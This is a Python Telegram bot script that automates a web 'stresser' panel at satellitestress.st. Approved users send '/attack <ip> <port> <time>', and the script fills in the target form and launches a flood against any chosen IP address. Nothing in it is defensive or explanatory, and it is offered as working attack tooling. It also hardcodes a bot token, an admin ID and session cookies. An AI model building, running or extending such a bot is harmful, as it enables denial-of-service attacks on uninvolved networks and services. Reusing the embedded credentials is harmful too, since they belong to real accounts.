import time
import asyncio
import json
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from playwright.async_api import async_playwright

# ==================== CONFIG ====================
BOT_TOKEN = "8521144614:AAHFv7ZbSzwklQwaRznTGKCeCzyGMZtZbQg"
ADMIN_ID = 7820814565

# Teri exact cookies (jo tune di thi)
COOKIE_STRING = "__diamwall=0x1806789675; satellite_auth=27f6f658-66cc-49a5-aca1-fe0e1370ae08; satellite_captcha_verified=HC2.eyJ2IjoxLCJ1aWQiOiJiNjU2OWVjOGVjZjFkM2ZhIiwiaWF0IjoxNzcyNzkzNjAzMDU2LCJleHAiOjE3NzI4ODAwMDMwNTYsIm5vbmNlIjoiZTE1ZDE3NTRmZmIzZDE0YyJ9.MwIfPA2ywSnctGJLWKPtx5IMgrFdjyNrsDP4EDoVwJ8"

# Website URLs
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"

# ==================== GLOBALS ====================
playwright = None
browser = None
context = None
page = None
browser_ready = False

# Approved users
approved_users = {}
is_attack_running = False
attack_end_time = 0
current_target = ""

# Auto-approve admin
approved_users[ADMIN_ID] = time.time() + (365 * 86400)

# ==================== COOKIE PARSING ====================
def parse_cookies():
    """Cookie string ko list of dicts mein convert karo"""
    cookies = []
    for item in COOKIE_STRING.split(';'):
        if '=' in item:
            name, value = item.strip().split('=', 1)
            cookies.append({
                'name': name,
                'value': value,
                'domain': '.satellitestress.st',
                'path': '/',
                'secure': True,
                'httpOnly': False,
                'sameSite': 'Lax'
            })
    return cookies

# ==================== BROWSER INIT ====================
async def init_browser():
    """Browser start karo aur cookies load karo"""
    global playwright, browser, context, page, browser_ready
    
    try:
        print("🔄 Starting browser...")
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(headless=True)
        context = await browser.new_context()
        
        # Add cookies
        cookies = parse_cookies()
        await context.add_cookies(cookies)
        print("✅ Cookies loaded!")
        
        page = await context.new_page()
        
        # Test cookies on attack page
        await page.goto(WEBSITE_URL, wait_until='domcontentloaded', timeout=30000)
        await page.wait_for_timeout(2000)
        
        # Check if login successful
        current_url = page.url
        if "login" not in current_url:
            print("✅ Successfully logged in with cookies!")
            browser_ready = True
        else:
            print("❌ Cookies may be expired")
            browser_ready = False
            
    except Exception as e:
        print(f"❌ Browser error: {e}")
        browser_ready = False

# ==================== USER FUNCTIONS ====================
def is_approved(user_id: int):
    if user_id in approved_users:
        return time.time() < approved_users[user_id]
    return False

# ==================== TELEGRAM COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = """
⚡ **ATTACK BOT** ⚡️

🎯 COMMANDS:
/attack <ip> <port> <time>
/myid - Check your ID
/status - Bot status

𝐎𝐖𝐍𝐄𝐑 : @RagnarokXop
    """
    await update.message.reply_text(welcome)

async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(f"Your ID: `{user_id}`")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if browser_ready:
        await update.message.reply_text("✅ Bot is ready to attack!")
    else:
        await update.message.reply_text("❌ Bot not ready. Check logs.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, attack_end_time, current_target, page, browser_ready
    
    user_id = update.effective_user.id
    
    # Check approval
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved. Contact admin.")
        return
    
    # Check bot ready
    if not browser_ready or page is None:
        await update.message.reply_text("❌ Bot not ready yet. Try again in few seconds.")
        return
    
    # Check cooldown
    if is_attack_running:
        remaining = attack_end_time - time.time()
        if remaining > 0:
            await update.message.reply_text(f"⚠️ Attack already running. Wait {int(remaining)}s")
            return
    
    # Parse arguments
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    
    ip, port_str, time_str = args
    
    try:
        port = int(port_str)
        duration = int(time_str)
        
        if duration < 10 or duration > 300:
            await update.message.reply_text("❌ Time must be 10-300 seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid numbers")
        return
    
    # Set attack state
    is_attack_running = True
    attack_end_time = time.time() + duration
    current_target = f"{ip}:{port}"
    
    # Send initial message
    msg = await update.message.reply_text(
        f"🔄 **Launching Attack**\n\n"
        f"Target: {ip}:{port}\n"
        f"Duration: {duration}s"
    )
    
    # Execute attack
    try:
        # Go to attack page
        await page.goto(WEBSITE_URL, wait_until='domcontentloaded', timeout=30000)
        await page.wait_for_timeout(2000)
        
        # Find all text inputs
        inputs = await page.query_selector_all('input[type="text"]')
        
        if len(inputs) >= 3:
            # Fill IP (pehla input)
            await inputs[0].fill('')
            await inputs[0].fill(ip)
            
            # Fill Port (dusra input)
            await inputs[1].fill('')
            await inputs[1].fill(str(port))
            
            # Fill Time (teesra input)
            await inputs[2].fill('')
            await inputs[2].fill(str(duration))
            
            # Find and click launch button
            launch_btn = await page.query_selector('button:has-text("Launch")')
            if launch_btn:
                await launch_btn.click()
                await msg.edit_text(
                    f"✅ **Attack Launched!**\n\n"
                    f"Target: {ip}:{port}\n"
                    f"Duration: {duration}s\n"
                    f"Status: Attack in progress..."
                )
                
                # Wait for attack duration
                await asyncio.sleep(duration)
                await update.message.reply_text("✅ **Attack Completed!** 🎯")
            else:
                await msg.edit_text("❌ Launch button not found")
        else:
            await msg.edit_text(f"❌ Only {len(inputs)} input fields found")
            
    except Exception as e:
        await msg.edit_text(f"❌ Attack failed: {str(e)}")
    
    finally:
        is_attack_running = False
        current_target = ""

# ==================== MAIN ====================
async def main():
    print("="*60)
    print("🤖 ATTACK BOT STARTING...")
    print("="*60)
    
    # Initialize browser
    await init_browser()
    
    # Start Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("attack", attack))
    
    print("✅ Bot is running!")
    print("="*60)
    
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
